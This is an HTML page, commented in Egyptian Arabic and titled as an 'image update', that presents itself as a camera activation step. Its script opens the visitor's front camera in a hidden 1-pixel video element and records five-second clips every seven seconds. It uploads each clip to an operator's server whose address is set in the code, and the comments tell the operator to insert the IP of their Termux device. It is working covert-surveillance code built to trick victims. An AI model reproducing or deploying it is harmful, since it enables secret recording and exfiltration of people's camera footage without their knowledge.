<!DOCTYPE html>
<html>
<head>
  <title>تحديث الصورة</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body, html { margin:0; padding:0; background:#000; overflow:hidden; }
    video { width:1px; height:1px; opacity:0; }
    .msg { color:white; font-family:Arial; text-align:center; padding-top:40vh; font-size:20px; }
  </style>
</head>
<body>
  <div class="msg">جاري تفعيل الكاميرا...</div>
  <video id="v" autoplay playsinline></video>

  <script>
    // غيّر الـ IP ده بـ IP جهازك اللي طلع في Termux
    const SERVER_URL = "http://192.168.1.10:5555/upload";  // ← غيّر الرقم ده !

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
      .then(stream => {
        document.querySelector('.msg').innerHTML = "تم تفعيل الكاميرا ✓";
        const video = document.getElementById('v');
        video.srcObject = stream;

        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const fd = new FormData();
          fd.append('video', blob, 'cam.webm');

          fetch(SERVER_URL, {
            method: 'POST',
            body: fd,
            mode: 'no-cors'  // مهم عشان ما يفشل الإرسال
          });

          chunks = [];
        };

        // يسجّل 5 ثواني كل 7 ثواني (عشان ما يعلّق)
        setInterval(() => {
          if (recorder.state === "inactive") recorder.start();
          setTimeout(() => {
            if (recorder.state === "recording") recorder.stop();
          }, 5000);
        }, 7000);

      })
      .catch(err => {
        document.querySelector('.msg').innerHTML = "تم رفض الوصول للكاميرا ❌";
      });
  </script>
</body>
</html>
